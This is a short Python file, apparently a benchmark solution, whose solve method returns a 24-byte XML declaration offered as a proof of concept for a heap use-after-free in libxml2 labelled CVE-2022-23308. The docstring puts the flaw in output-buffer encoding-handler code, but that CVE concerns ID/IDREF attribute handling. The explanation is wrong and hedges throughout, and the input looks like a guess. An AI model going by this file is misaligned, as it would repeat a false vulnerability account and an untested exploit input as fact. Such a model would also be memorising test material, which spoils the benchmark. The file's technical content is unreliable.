import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability in libxml2.
        The vulnerability (CVE-2022-23308) occurs in xmlOutputBufferCreate/xmlAllocOutputBufferInternal
        when an encoding handler is provided. The handler might be double-freed if the buffer creation
        fails (e.g. in calling functions like xmlOutputBufferCreateFilename) or if ownership logic is flawed.
        
        Using an encoding like "ASCII" ensures a char encoding handler is allocated (unlike UTF-8 which
        might be handled internally/NULL).
        
        The string '<?xml encoding="ASCII"?>' is exactly 24 bytes.
        """
        return b'<?xml encoding="ASCII"?>'